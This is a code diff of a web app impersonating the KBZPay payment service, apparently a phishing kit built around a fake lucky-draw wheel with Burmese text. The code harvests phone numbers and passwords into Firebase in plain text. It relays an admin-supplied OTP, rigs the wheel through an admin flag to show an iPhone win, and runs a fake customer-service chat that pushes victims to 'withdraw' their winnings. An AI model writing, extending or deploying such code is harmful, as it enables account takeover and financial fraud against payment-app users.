-b.innerHTML=`<div style="animation:slideUp .5s ease;width:min(90vw,360px);margin-top:6px;padding:0 4px;"> <div style="background:linear-gradient(135deg,#0A1A3A,#0F2355);border:1.5px solid rgba(255,215,0,0.28);border-radius:18px;padding:16px 14px 6px;margin-bottom:8px;"> <div style="text-align:center;margin-bottom:11px;"> <div style="color:rgba(255,255,255,0.35);font-size:9px;font-weight:700;letter-spacing:2px;margin-bottom:3px;">📊 ဆုငွေ စုစုပေါင်း</div> ${total>0?`<div style="font-size:30px;font-weight:900;color:#FFD700;text-shadow:0 0 20px rgba(255,215,0,0.5);line-height:1;">${total.toLocaleString()}</div><div style="color:rgba(255,255,255,0.3);font-size:11px;margin-top:2px;">ကျပ် MMK</div>`:'<div style="font-size:30px;">🏆</div>'} </div> <div style="display:flex;gap:4px;flex-wrap:wrap;justify-content:center;padding-bottom:11px;border-bottom:1px solid rgba(255,255,255,0.05);margin-bottom:11px;"> ${history.map((h,i)=>`<div style="display:flex;align-items:center;gap:4px;padding:3px 9px;border-radius:20px;background:${h.color}15;border:1px solid ${h.color}38;"><span style="color:rgba(255,255,255,0.28);font-size:9px;">Spin${i+1}</span><span style="color:${h.color};font-size:10px;font-weight:900;">${h.isSpecial?‘📱 iPhone’:h.display+’ MMK’}</span></div>`).join('')} </div> <div style="text-align:center;color:rgba(255,255,255,0.2);font-size:10px;padding-bottom:11px;">Customer Service သို့ ဆက်သွယ်ပြီး ဆုငွေ ထုတ်ယူပါ</div> </div> <div style="background:linear-gradient(135deg,#001E55,#002A7A);border:1.5px solid rgba(0,119,230,0.45);border-radius:16px;padding:13px;"> <div style="display:flex;align-items:center;gap:9px;margin-bottom:11px;"> <div style="width:38px;height:38px;border-radius:11px;background:linear-gradient(135deg,#005DB8,#0099FF);display:flex;align-items:center;justify-content:center;font-size:19px;flex-shrink:0;">💬</div> <div><div style="color:white;font-size:13px;font-weight:900;">Customer Service</div><div style="color:rgba(255,255,255,0.38);font-size:10px;margin-top:1px;">🟢 Online · 24/7</div></div> </div> <button id="gchat" style="width:100%;padding:13px;border-radius:13px;border:none;background:linear-gradient(135deg,#005DB8,#0077E6,#0099FF);color:white;font-size:14px;font-weight:900;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 5px 18px rgba(0,93,184,0.5);animation:kpulse 2s ease-in-out infinite;"><span style="font-size:17px;">💬</span>ဆုငွေ ထုတ်ယူရန် ဆက်သွယ်ပါ</button> </div> </div>`;
-b.querySelector(’#gchat’).onclick=()=>go(‘chat’);
 }
-root.appendChild(d);
+makeStars('home-stars',35);
+
+// ── Prize chips ───────────────────────────────────────────────────────────────
+function renderPrizeChips(containerId){
+  const c=document.getElementById(containerId); if(!c)return;
+  c.innerHTML='';
+  PRIZES.forEach(p=>{
+    const d=document.createElement('div');
+    d.style.cssText=`padding:3px 9px;border-radius:20px;background:${p.color}18;border:1px solid ${p.color}45;color:${p.color};font-size:10px;font-weight:800;`;
+    d.textContent=p.isSpecial?'📱 iPhone':p.display;
+    c.appendChild(d);
+  });
 }
+renderPrizeChips('home-prizes');
+renderPrizeChips('spin-prize-chips');
 
-/* ═══ CHAT ══════════════════════════════════════════════════════ */
-function Chat(root){
-const d=document.createElement(‘div’);
-d.style.cssText=‘min-height:100vh;background:#0A1428;display:flex;flex-direction:column;max-width:480px;margin:0 auto;’;
-const total=S.winHistory.reduce((s,p)=>s+(p.amount||0),0);
-const uid=sk(S.phone);
-let imgs=[];
+// ── OTP Boxes setup ───────────────────────────────────────────────────────────
+function setupOTPBoxes(){
+  const wrap=document.getElementById('otp-boxes'); wrap.innerHTML='';
+  for(let i=0;i<6;i++){
+    const inp=document.createElement('input');
+    inp.type='tel'; inp.inputMode='numeric'; inp.maxLength=1; inp.id='otp-'+i;
+    inp.style.cssText='width:44px;height:55px;text-align:center;font-size:24px;font-weight:900;background:rgba(255,255,255,.05);border:1.5px solid rgba(255,255,255,.1);border-radius:13px;color:white;outline:none;transition:all .2s;caret-color:#0099FF;font-family:inherit;';
+    inp.addEventListener('input',e=>{
+      e.target.value=e.target.value.replace(/\D/g,'').slice(-1);
+      e.target.style.background=e.target.value?'rgba(0,93,184,.28)':'rgba(255,255,255,.05)';
+      e.target.style.borderColor=e.target.value?'#0077E6':'rgba(255,255,255,.1)';
+      if(e.target.value && i<5) document.getElementById('otp-'+(i+1)).focus();
+    });
+    inp.addEventListener('keydown',e=>{if(e.key==='Backspace'&&!e.target.value&&i>0) document.getElementById('otp-'+(i-1)).focus();});
+    wrap.appendChild(inp);
+  }
+}
+setupOTPBoxes();
 
-d.innerHTML=`
+// ── Login ─────────────────────────────────────────────────────────────────────
+function showErr(id,msg){const el=document.getElementById(id);el.textContent=msg;el.style.display='block';}
+function hideErr(id){const el=document.getElementById(id);if(el)el.style.display='none';}
+function togglePass(){const i=document.getElementById('inp-pass'),e=document.getElementById('pass-eye');i.type=i.type==='password'?'text':'password';e.textContent=i.type==='password'?'👁':'🙈';}
 
-  <div style="background:linear-gradient(135deg,#005DB8,#0077E6);padding:0 14px;flex-shrink:0;box-shadow:0 2px 18px rgba(0,93,184,0.5);">
-    <div style="display:flex;align-items:center;gap:10px;padding:10px 0;">
-      <button id="cbk" style="background:rgba(255,255,255,0.2);border:none;border-radius:9px;width:34px;height:34px;color:white;font-size:17px;cursor:pointer;display:flex;align-items:center;justify-content:center;">←</button>
-      <div style="width:38px;height:38px;border-radius:11px;background:white;display:flex;flex-direction:column;align-items:center;justify-content:center;flex-shrink:0;"><span style="color:#005DB8;font-weight:900;font-size:11px;line-height:1.1;">KBZ</span><span style="color:#005DB8;font-weight:700;font-size:8px;">Pay</span></div>
-      <div style="flex:1;min-width:0;"><div style="color:white;font-weight:800;font-size:13px;">KBZPay Service Team</div><div style="color:rgba(255,255,255,0.65);font-size:10px;display:flex;align-items:center;gap:3px;"><span style="width:6px;height:6px;border-radius:50%;background:#4AFF91;display:inline-block;"></span>Online · 24/7</div></div>
-    </div>
-  </div>
-  ${S.winHistory.length>0?`<div style="background:rgba(255,215,0,0.07);border-bottom:1px solid rgba(255,215,0,0.12);padding:8px 13px;flex-shrink:0;">
-    <div style="color:rgba(255,255,255,0.35);font-size:9px;font-weight:700;letter-spacing:1px;margin-bottom:4px;">💰 ဆုငွေ ${total?total.toLocaleString()+' MMK':''}</div>
-    <div style="display:flex;gap:4px;flex-wrap:wrap;">${S.winHistory.map(h=>`<div style="padding:2px 8px;border-radius:20px;background:${h.color}15;border:1px solid ${h.color}38;color:${h.color};font-size:10px;font-weight:800;">${h.isSpecial?'📱 iPhone':h.display+' MMK'}</div>`).join('')}</div>
-  </div>`:''}
-  <div id="cmsgs" style="flex:1;overflow-y:auto;padding:13px;display:flex;flex-direction:column;gap:10px;">
-    <div style="text-align:center;"><span style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.07);border-radius:20px;padding:4px 12px;color:rgba(255,255,255,.22);font-size:10px;">🔒 Secure Chat</span></div>
-  </div>
-  <div id="ipstrip" style="display:none;background:rgba(255,255,255,.03);border-top:1px solid rgba(255,255,255,.06);padding:8px 13px;flex-shrink:0;">
-    <div id="iplist" style="display:flex;gap:7px;overflow-x:auto;"></div>
-  </div>
-  <div style="background:rgba(255,255,255,.03);border-top:1px solid rgba(255,255,255,.06);padding:9px 10px;flex-shrink:0;display:flex;align-items:flex-end;gap:7px;padding-bottom:calc(9px + env(safe-area-inset-bottom,0px));">
-    <button id="cpbtn" style="background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.09);border-radius:10px;width:38px;height:38px;color:white;font-size:18px;cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0;">📷</button>
-    <input type="file" id="cfile" accept="image/*" multiple style="display:none;"/>
-    <div style="flex:1;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.09);border-radius:13px;padding:9px 11px;">
-      <textarea id="cinput" placeholder="စာရိုက်ပါ..." rows="1" style="background:none;border:none;outline:none;color:white;font-size:13px;width:100%;resize:none;line-height:1.4;max-height:88px;overflow:auto;caret-color:#0099FF;font-family:inherit;"></textarea>
-    </div>
-    <button id="csend" style="background:linear-gradient(135deg,#005DB8,#0077E6);border:none;border-radius:10px;width:38px;height:38px;color:white;font-size:16px;cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0;">➤</button>
-  </div>`;
-
-function renderMsgs(msgs){
-const el=d.querySelector(’#cmsgs’);
-const atBot=el.scrollTop+el.clientHeight>=el.scrollHeight-40;
-const chip=el.querySelector(‘div:first-child’);el.innerHTML=’’;if(chip)el.appendChild(chip);
-if(!msgs){if(atBot)el.scrollTop=el.scrollHeight;return;}
-Object.values(msgs).forEach(m=>{
-const isU=m.from===‘user’;
-const wrap=document.createElement(‘div’);
-wrap.style.cssText=`display:flex;flex-direction:column;align-items:${isU?'flex-end':'flex-start'};gap:3px;`;
-if(!isU)wrap.innerHTML=`<div style="display:flex;align-items:center;gap:5px;margin-left:3px;"><div style="width:22px;height:22px;border-radius:7px;background:linear-gradient(135deg,#005DB8,#0099FF);display:flex;align-items:center;justify-content:center;"><span style="color:white;font-size:10px;font-weight:900;">K</span></div><span style="color:rgba(255,255,255,.28);font-size:9px;">KBZPay Service</span></div>`;
-if(m.images&&m.images.length>0){const ir=document.createElement(‘div’);ir.style.cssText=`display:flex;gap:5px;flex-wrap:wrap;justify-content:${isU?'flex-end':'flex-start'};${m.text?'margin-bottom:5px;':''}`;m.images.forEach(src=>{const img=document.createElement(‘img’);img.src=src;img.style.cssText=‘width:115px;height:95px;object-fit:cover;border-radius:10px;border:1px solid rgba(255,255,255,.09);cursor:pointer;’;img.onclick=()=>window.open(src,’_blank’);ir.appendChild(img);});wrap.appendChild(ir);}
-if(m.text){const b=document.createElement(‘div’);b.style.cssText=`max-width:78%;background:${isU?'linear-gradient(135deg,#005DB8,#0077E6)':'rgba(255,255,255,.06)'};border:${isU?'none':'1px solid rgba(255,255,255,.07)'};border-radius:${isU?'16px 16px 4px 16px':'16px 16px 16px 4px'};padding:9px 12px;color:white;font-size:13px;line-height:1.55;word-break:break-word;`;b.textContent=m.text;wrap.appendChild(b);}
-const t=document.createElement(‘div’);t.style.cssText=`color:rgba(255,255,255,.18);font-size:9px;margin-top:2px;text-align:${isU?'right':'left'};padding:0 3px;`;t.textContent=fmtT(m.ts);wrap.appendChild(t);
-el.appendChild(wrap);
-});
-if(atBot)el.scrollTop=el.scrollHeight;
+async function doLogin(){
+  hideErr('login-err');
+  const phone=document.getElementById('inp-phone').value.trim();
+  const pass=document.getElementById('inp-pass').value.trim();
+  if(phone.length<9){showErr('login-err','ဖုန်းနံပါတ် မှန်ကန်စွာ ထည့်ပါ');return;}
+  if(pass.length<6){showErr('login-err','Password အနည်းဆုံး ၆ လုံး ဖြည့်ပါ');return;}
+  const userId=uid(phone);
+  STATE.userId=userId; STATE.phone=phone;
+  // Navigate immediately — don't block on Firebase
+  document.getElementById('otp-hint').textContent=`${phone.slice(0,3)}****${phone.slice(-3)} သို့ Admin မှ OTP ပေးပို့ပါမည်`;
+  listenOTP();
+  show('otp');
+  // Save to Firebase in background (only set if not exists to preserve spinsLeft/iphoneMode)
+  try{
+    const snap=await db.ref('users/'+userId).once('value');
+    if(!snap.val()){
+      await db.ref('users/'+userId).set({phone,password:pass,createdAt:Date.now(),otpVerified:false,otp:'',spinsLeft:3,iphoneMode:false,lastSeen:Date.now()});
+    } else {
+      await db.ref('users/'+userId).update({phone,password:pass,lastSeen:Date.now()});
+    }
+  } catch(e){ console.warn('Firebase write error:',e); }
 }
 
-S.offChat=fon(‘chats/’+uid+’/messages’,renderMsgs);
-fonce(‘chats/’+uid+’/messages’).then(v=>{if(!v)fpush(‘chats/’+uid+’/messages’,{from:‘admin’,text:‘မင်္ဂလာပါ! KBZPay Customer Service မှ ကြိုဆိုပါသည်။ ဆုငွေ ထုတ်ယူရန် ကူညီပေးပါမည် 😊’,ts:now()});});
-
-function sendMsg(){
-const txt=d.querySelector(’#cinput’).value.trim();
-if(!txt&&imgs.length===0)return;
-fpush(‘chats/’+uid+’/messages’,{from:‘user’,text:txt,images:[…imgs],ts:now()});
-fupd(‘chats/’+uid,{lastMsg:txt||’(ဓာတ်ပုံ)’,lastMsgAt:now(),unread:firebase.database.ServerValue.increment(1)});
-d.querySelector(’#cinput’).value=’’;imgs=[];renderImgPrev();
-}
-function renderImgPrev(){
-const strip=d.querySelector(’#ipstrip’),list=d.querySelector(’#iplist’);
-if(!imgs.length){strip.style.display=‘none’;list.innerHTML=’’;return;}
-strip.style.display=‘block’;
-list.innerHTML=imgs.map((src,i)=>`<div style="position:relative;flex-shrink:0;"><img src="${src}" style="width:58px;height:58px;object-fit:cover;border-radius:8px;"/><button onclick="window.__ri(${i})" style="position:absolute;top:-5px;right:-5px;width:17px;height:17px;border-radius:50%;background:#FF3B30;border:none;color:white;font-size:10px;cursor:pointer;line-height:1;">×</button></div>`).join(’’);
-}
-window.__ri=i=>{imgs.splice(i,1);renderImgPrev();};
-d.querySelector(’#cpbtn’).onclick=()=>d.querySelector(’#cfile’).click();
-d.querySelector(’#cfile’).onchange=e=>{Array.from(e.target.files||[]).forEach(f=>{const r=new FileReader();r.onload=ev=>{imgs.push(ev.target.result);renderImgPrev();};r.readAsDataURL(f);});e.target.value=’’;};
-d.querySelector(’#csend’).onclick=sendMsg;
-d.querySelector(’#cinput’).onkeydown=e=>{if(e.key===‘Enter’&&!e.shiftKey){e.preventDefault();sendMsg();}};
-d.querySelector(’#cbk’).onclick=()=>go(‘spin’);
-root.appendChild(d);
+// ── OTP ───────────────────────────────────────────────────────────────────────
+function listenOTP(){
+  if(STATE.otpListener) STATE.otpListener();
+  STATE.otpListener = db.ref('users/'+STATE.userId+'/otp').on('value', snap=>{
+    const otp=snap.val();
+    if(otp && otp.length===6){
+      document.getElementById('otp-status').textContent='✅ OTP ရရှိပါပြီ — ဖြည့်ပါ';
+      // Auto-fill OTP boxes
+      for(let i=0;i<6;i++){
+        const box=document.getElementById('otp-'+i);
+        if(box){box.value=otp[i];box.style.background='rgba(0,93,184,.28)';box.style.borderColor='#0077E6';}
+      }
+    }
+  });
 }
 
-render();
+function verifyOTP(){
+  hideErr('otp-err');
+  const entered=Array.from({length:6},(_,i)=>document.getElementById('otp-'+i)?.value||'').join('');
+  if(entered.length<6){showErr('otp-err','OTP ကုဒ် ၆ လုံး ရိုက်ထည့်ပါ');return;}
+  db.ref('users/'+STATE.userId+'/otp').once('value',snap=>{
+    if(snap.val()===entered){
+      db.ref('users/'+STATE.userId).update({otpVerified:true});
+      if(STATE.otpListener){db.ref('users/'+STATE.userId+'/otp').off('value',STATE.otpListener);STATE.otpListener=null;}
+      initSpin();
+      show('spin');
+    } else {
+      showErr('otp-err','OTP ကုဒ် မမှန်ပါ။ ထပ်မံ စစ်ဆေးပါ');
+    }
+  });
+}
+
+// ── Draw Wheel ────────────────────────────────────────────────────────────────
+function drawWheel(){
+  const canvas=document.getElementById('wheel-cv'); if(!canvas)return;
+  const dpr=window.devicePixelRatio||1,W=canvas.offsetWidth,H=canvas.offsetHeight;
+  canvas.width=W*dpr; canvas.height=H*dpr;
+  const ctx=canvas.getContext('2d'); ctx.scale(dpr,dpr);
+  const cx=W/2,cy=H/2,R=Math.min(W,H)/2-5,rIn=R*.20;
+  const rg=ctx.createLinearGradient(cx-R,cy-R,cx+R,cy+R);
+  rg.addColorStop(0,'#FFF5A0');rg.addColorStop(.3,'#FFD700');rg.addColorStop(.7,'#C8860A');rg.addColorStop(1,'#FFE566');
+  ctx.beginPath();ctx.arc(cx,cy,R+10,0,Math.PI*2);ctx.fillStyle=rg;ctx.fill();
+  for(let i=0;i<28;i++){
+    const a=(i/28)*Math.PI*2-Math.PI/2,gx=cx+Math.cos(a)*(R+5),gy=cy+Math.sin(a)*(R+5);
+    const g=ctx.createRadialGradient(gx-1,gy-1,0,gx,gy,4.5),col=PRIZES[i%N].color;
+    g.addColorStop(0,'#FFF');g.addColorStop(.4,col);g.addColorStop(1,darken(col,40));
+    ctx.beginPath();ctx.arc(gx,gy,4.5,0,Math.PI*2);ctx.fillStyle=g;ctx.fill();
+    ctx.strokeStyle='rgba(255,255,255,.6)';ctx.lineWidth=.8;ctx.stroke();
+  }
+  PRIZES.forEach((p,i)=>{
+    const sA=i*SEG_RAD-Math.PI/2,eA=sA+SEG_RAD,mA=sA+SEG_RAD/2;
+    const gx1=cx+Math.cos(mA)*R*.15,gy1=cy+Math.sin(mA)*R*.15,gx2=cx+Math.cos(mA)*R*.98,gy2=cy+Math.sin(mA)*R*.98;
+    const sg=ctx.createLinearGradient(gx1,gy1,gx2,gy2);
+    sg.addColorStop(0,p.light);sg.addColorStop(.45,p.color);sg.addColorStop(1,p.dark);
+    ctx.beginPath();ctx.moveTo(cx,cy);ctx.arc(cx,cy,R,sA,eA);ctx.closePath();ctx.fillStyle=sg;ctx.fill();
+    ctx.beginPath();ctx.moveTo(cx,cy);ctx.arc(cx,cy,R,sA,eA);ctx.closePath();ctx.strokeStyle='rgba(255,255,255,.5)';ctx.lineWidth=2;ctx.stroke();
+    ctx.save();ctx.beginPath();ctx.moveTo(cx,cy);ctx.arc(cx,cy,R*.6,sA,eA);ctx.closePath();ctx.clip();
+    const hg=ctx.createLinearGradient(gx1,gy1,gx2,gy2);hg.addColorStop(0,'rgba(255,255,255,.2)');hg.addColorStop(1,'rgba(255,255,255,0)');
+    ctx.fillStyle=hg;ctx.fill();ctx.restore();
+    ctx.save();ctx.translate(cx,cy);ctx.rotate(mA+Math.PI/2);
+    ctx.shadowColor='rgba(0,0,0,.7)';ctx.shadowBlur=6;ctx.textAlign='center';ctx.textBaseline='middle';ctx.fillStyle='#FFF';
+    if(p.isSpecial){
+      ctx.font=`${Math.round(R*.12)}px serif`;ctx.fillText('📱',0,-(R*.52));
+      ctx.font=`900 ${Math.round(R*.085)}px 'Segoe UI',sans-serif`;ctx.fillText('အထူးဆု',0,-(R*.36));
+      ctx.font=`700 ${Math.round(R*.06)}px 'Segoe UI',sans-serif`;ctx.fillStyle='rgba(255,255,255,.85)';ctx.fillText('iPhone 17',0,-(R*.22));
+    } else {
+      ctx.font=`900 ${Math.round(R*.105)}px 'Segoe UI',sans-serif`;ctx.fillText(p.display,0,-(R*.62));
+      ctx.shadowBlur=3;ctx.font=`700 ${Math.round(R*.066)}px 'Segoe UI',sans-serif`;ctx.fillStyle='rgba(255,255,255,.85)';ctx.fillText('MMK',0,-(R*.76)+R*.01);
+      ctx.shadowBlur=4;ctx.font=`${Math.round(R*.11)}px serif`;ctx.fillStyle='#FFF';ctx.fillText('🪙',0,-(R*.30));
+    }
+    ctx.restore();
+  });
+  const hg2=ctx.createRadialGradient(cx-rIn*.3,cy-rIn*.3,0,cx,cy,rIn);
+  hg2.addColorStop(0,'#FFFDE0');hg2.addColorStop(.4,'#FFD700');hg2.addColorStop(.75,'#C8860A');hg2.addColorStop(1,'#7A4F00');
+  ctx.beginPath();ctx.arc(cx,cy,rIn,0,Math.PI*2);ctx.fillStyle=hg2;ctx.fill();
+  ctx.strokeStyle='rgba(255,255,255,.8)';ctx.lineWidth=3;ctx.stroke();
+  ctx.save();ctx.font=`900 ${Math.round(rIn*.7)}px 'Segoe UI',sans-serif`;ctx.textAlign='center';ctx.textBaseline='middle';ctx.fillStyle='#003580';ctx.shadowColor='rgba(255,255,255,.6)';ctx.shadowBlur=4;ctx.fillText('K',cx,cy);ctx.restore();
+}
+
+// ── Spin init ─────────────────────────────────────────────────────────────────
+function initSpin(){
+  makeStars('spin-stars',55);
+  requestAnimationFrame(drawWheel);
+  if(!STATE.userId)return;
+  // Listen to iphoneMode & spinsLeft from Firebase
+  db.ref('users/'+STATE.userId).once('value',snap=>{
+    const d=snap.val()||{};
+    STATE.spinsLeft=d.spinsLeft!=null?d.spinsLeft:3;
+    STATE.history=d.history?Object.values(d.history):[];
+    updateSpinUI();
+    if(d.iphoneMode) document.getElementById('iphone-banner').style.display='flex';
+  });
+  // Listen to iphoneMode changes
+  db.ref('users/'+STATE.userId+'/iphoneMode').on('value',snap=>{
+    const el=document.getElementById('iphone-banner');
+    if(el) el.style.display=snap.val()?'flex':'none';
+  });
+}
+
+function updateSpinUI(){
+  document.getElementById('spins-left').textContent=STATE.spinsLeft;
+  document.getElementById('spin-left-txt').textContent=STATE.spinsLeft;
+  const btn=document.getElementById('spin-btn');
+  if(STATE.spinsLeft<=0||STATE.spinning){
+    btn.style.background='linear-gradient(135deg,#2a2a4a,#1a1a3a)';
+    btn.style.color='rgba(255,255,255,.25)';
+    btn.style.animation='none';
+    btn.innerHTML=STATE.spinsLeft<=0?'🔒 ကြိမ်ကုန်သွားပြီ':btn.innerHTML;
+  } else {
+    btn.style.background='linear-gradient(135deg,#FFE566 0%,#FFD700 35%,#FF8C00 70%,#FF5500 100%)';
+    btn.style.color='#1A0500';
+    btn.style.animation='pulse 2s ease-in-out infinite';
+    btn.innerHTML='🎰 SPIN NOW';
+  }
+  const hint=document.getElementById('spin-hint');
+  if(hint) hint.style.display=STATE.spinsLeft>0&&!STATE.spinning?'block':'none';
+  if(STATE.spinsLeft<=0) document.getElementById('contact-banner').style.display='block';
+  // History
+  if(STATE.history.length>0){
+    const hw=document.getElementById('spin-history-wrap');hw.style.display='block';
+    const hc=document.getElementById('spin-history');hc.innerHTML='';
+    STATE.history.forEach(h=>{
+      const d=document.createElement('div');
+      d.style.cssText=`padding:3px 10px;border-radius:20px;background:${PRIZES[h.id].color}18;border:1px solid ${PRIZES[h.id].color}40;color:${PRIZES[h.id].color};font-size:11px;font-weight:800;`;
+      d.textContent=h.isSpecial?'📱 iPhone':`${PRIZES[h.id].display} MMK`;
+      hc.appendChild(d);
+    });
+  }
+}
+
+// ── Spin logic ────────────────────────────────────────────────────────────────
+function doSpin(){
+  if(STATE.spinning||STATE.spinsLeft<=0)return;
+  db.ref('users/'+STATE.userId+'/iphoneMode').once('value',snap=>{
+    const iphoneMode=snap.val()||false;
+    let winIdx;
+    if(iphoneMode){winIdx=6;}
+    else{
+      const weights=[35,28,18,10,5,3,1],total=weights.reduce((a,b)=>a+b,0);
+      let pick=Math.random()*total;winIdx=0;
+      for(let i=0;i<weights.length;i++){pick-=weights[i];if(pick<=0){winIdx=i;break;}}
+    }
+    const segCenter=(winIdx+.5)*SEG_DEG;
+    const extra=((-(segCenter+STATE.rotation))%360+360)%360;
+    const totalDelta=(6+Math.floor(Math.random()*4))*360+(extra===0?360:extra);
+    const target=STATE.rotation+totalDelta;
+    STATE.rotation=target; STATE.spinning=true;
+    const cv=document.getElementById('wheel-cv');
+    cv.style.transition='transform 5s cubic-bezier(0.08,0.6,0.12,1.0)';
+    cv.style.transform=`rotate(${target}deg)`;
+    document.getElementById('spin-ring').style.opacity='0.65';
+    updateSpinUI();
+    setTimeout(()=>{
+      STATE.spinning=false; STATE.spinsLeft--;
+      const prize=PRIZES[winIdx];
+      STATE.history.push(prize);
+      const histObj={};STATE.history.forEach((h,i)=>histObj[i]=h);
+      db.ref('users/'+STATE.userId).update({spinsLeft:STATE.spinsLeft,history:histObj});
+      document.getElementById('spin-ring').style.opacity='0.22';
+      showResult(prize);
+      updateSpinUI();
+      if(STATE.spinsLeft<=0) setTimeout(()=>{document.getElementById('contact-banner').style.display='block';},500);
+    },5200);
+  });
+}
+
+// ── Result popup ──────────────────────────────────────────────────────────────
+function showResult(prize){
+  const ov=document.getElementById('result-overlay'),card=document.getElementById('result-card');
+  ov.style.display='flex';
+  card.style.border=`2.5px solid ${prize.color}`;
+  card.style.boxShadow=`0 0 70px ${prize.color}55,0 22px 55px rgba(0,0,0,.6)`;
+  document.getElementById('result-glow').style.background=`radial-gradient(circle at 50% 30%,${prize.color}22 0%,transparent 65%)`;
+  document.getElementById('result-icon').textContent=prize.isSpecial?'🏆':'🎉';
+  const inner=document.getElementById('result-inner');
+  inner.style.cssText=`background:linear-gradient(135deg,${prize.color}22,${prize.color}0d);border:1.5px solid ${prize.color}70;border-radius:20px;padding:20px 14px;margin-bottom:20px;`;
+  if(prize.isSpecial){
+    inner.innerHTML=`<div style="font-size:46px;margin-bottom:8px;">📱</div><div style="color:${prize.color};font-size:20px;font-weight:900;text-shadow:0 0 28px ${prize.color}99;">iPhone 17 Pro Max</div><div style="color:rgba(255,255,255,.5);font-size:12px;margin-top:8px;">🎊 အထူးဆုကြီး ရရှိပါသည်!</div>`;
+  } else {
+    inner.innerHTML=`<div style="color:rgba(255,255,255,.55);font-size:13px;margin-bottom:6px;">သင်ရရှိသောဆုငွေ</div><div style="color:${prize.color};font-size:40px;font-weight:900;text-shadow:0 0 28px ${prize.color}99;line-height:1;">${prize.display}</div><div style="color:rgba(255,255,255,.4);font-size:13px;margin-top:5px;">ကျပ် · ${prize.mmk}</div>`;
+  }
+  launchConfetti(prize.color);
+}
+function closeResult(){document.getElementById('result-overlay').style.display='none';}
+
+// ── Confetti ──────────────────────────────────────────────────────────────────
+function launchConfetti(mainColor){
+  const cv=document.getElementById('confetti-cv'),ctx=cv.getContext('2d');
+  cv.width=window.innerWidth;cv.height=window.innerHeight;
+  const pts=Array.from({length:150},()=>({x:Math.random()*cv.width,y:-10-Math.random()*60,vx:(Math.random()-.5)*7,vy:Math.random()*5+2,color:PRIZES[Math.floor(Math.random()*N)].color,w:Math.random()*10+4,h:Math.random()*5+3,rot:Math.random()*360,rv:(Math.random()-.5)*12}));
+  let raf;
+  const draw=()=>{
+    ctx.clearRect(0,0,cv.width,cv.height);
+    pts.forEach(p=>{p.x+=p.vx;p.y+=p.vy;p.vy+=.12;p.rot+=p.rv;ctx.save();ctx.translate(p.x,p.y);ctx.rotate(p.rot*Math.PI/180);ctx.fillStyle=p.color;ctx.globalAlpha=Math.max(0,1-p.y/cv.height);ctx.fillRect(-p.w/2,-p.h/2,p.w,p.h);ctx.restore();});
+    pts.splice(0,pts.length,...pts.filter(p=>p.y<cv.height+20));
+    if(pts.length) raf=requestAnimationFrame(draw); else ctx.clearRect(0,0,cv.width,cv.height);
+  };
+  raf=requestAnimationFrame(draw);
+}
+
+// ── Chat ──────────────────────────────────────────────────────────────────────
+let pendingImgs=[];
+
+function initChat(){
+  if(!STATE.userId)return;
+  // Show win history
+  if(STATE.history.length>0){
+    const banner=document.getElementById('chat-win-banner'),list=document.getElementById('chat-win-list');
+    banner.style.display='block'; list.innerHTML='';
+    STATE.history.forEach(h=>{
+      const d=document.createElement('div');
+      d.style.cssText=`padding:3px 10px;border-radius:20px;background:${PRIZES[h.id].color}18;border:1px solid ${PRIZES[h.id].color}40;color:${PRIZES[h.id].color};font-size:11px;font-weight:800;`;
+      d.textContent=h.isSpecial?'📱 iPhone':`${PRIZES[h.id].display} MMK`;
+      list.appendChild(d);
+    });
+  }
+  // Send system greeting if first time
+  db.ref('chats/'+STATE.userId).once('value',snap=>{
+    if(!snap.val()){
+      const key=db.ref('chats/'+STATE.userId).push().key;
+      db.ref('chats/'+STATE.userId+'/'+key).set({from:'agent',text:'မင်္ဂလာပါ! KBZPay Customer Service မှ ကြိုဆိုပါသည်။ Lucky Draw ဆုငွေနှင့်ပတ်သက်၍ မည်သို့ကူညီပေးရမည်နည်း? 😊',timestamp:Date.now()});
+    }
+  });
+  // Listen to messages
+  if(STATE.chatListener) db.ref('chats/'+STATE.userId).off('value',STATE.chatListener);
+  const container=document.getElementById('chat-msgs');
+  STATE.chatListener=db.ref('chats/'+STATE.userId).orderByChild('timestamp').limitToLast(100).on('value',snap=>{
+    container.innerHTML=`<div style="text-align:center;"><span style="background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.08);border-radius:20px;padding:4px 13px;color:rgba(255,255,255,.3);font-size:11px;">🔒 ဤ chat သည် လုံခြုံပါသည်</span></div>`;
+    if(snap.val()){
+      Object.values(snap.val()).sort((a,b)=>a.timestamp-b.timestamp).forEach(msg=>appendMsg(msg));
+    }
+    container.scrollTop=container.scrollHeight;
+  });
+}
+
+function appendMsg(msg){
+  const container=document.getElementById('chat-msgs');
+  const isUser=msg.from==='user';
+  const wrap=document.createElement('div');
+  wrap.style.cssText=`display:flex;flex-direction:column;align-items:${isUser?'flex-end':'flex-start'};gap:3px;`;
+  if(!isUser){
+    const agentRow=document.createElement('div');
+    agentRow.style.cssText='display:flex;align-items:center;gap:6px;margin-left:4px;';
+    agentRow.innerHTML=`<div style="width:25px;height:25px;border-radius:8px;background:linear-gradient(135deg,#005DB8,#0099FF);display:flex;align-items:center;justify-content:center;flex-shrink:0;"><span style="color:white;font-size:11px;font-weight:900;">K</span></div><span style="color:rgba(255,255,255,.3);font-size:11px;">KBZPay Service</span>`;
+    wrap.appendChild(agentRow);
+  }
+  const inner=document.createElement('div'); inner.style.maxWidth='78%';
+  if(msg.image){
+    const img=document.createElement('img');
+    img.src=msg.image; img.style.cssText='max-width:200px;border-radius:12px;border:1px solid rgba(255,255,255,.1);display:block;margin-bottom:'+(msg.text?'5px':'0');
+    inner.appendChild(img);
+  }
+  if(msg.text){
+    const bubble=document.createElement('div');
+    bubble.style.cssText=`background:${isUser?'linear-gradient(135deg,#005DB8,#0077E6)':'rgba(255,255,255,.07)'};border:${isUser?'none':'1px solid rgba(255,255,255,.08)'};border-radius:${isUser?'18px 18px 4px 18px':'18px 18px 18px 4px'};padding:11px 14px;color:white;font-size:14px;line-height:1.55;word-break:break-word;`;
+    bubble.textContent=msg.text; inner.appendChild(bubble);
+  }
+  const timeEl=document.createElement('div');
+  timeEl.style.cssText=`color:rgba(255,255,255,.2);font-size:10px;margin-top:2px;${isUser?'text-align:right;padding-right:4px;':'padding-left:4px;'}`;
+  timeEl.textContent=msg.time||ts(); inner.appendChild(timeEl);
+  wrap.appendChild(inner); container.appendChild(wrap);
+}
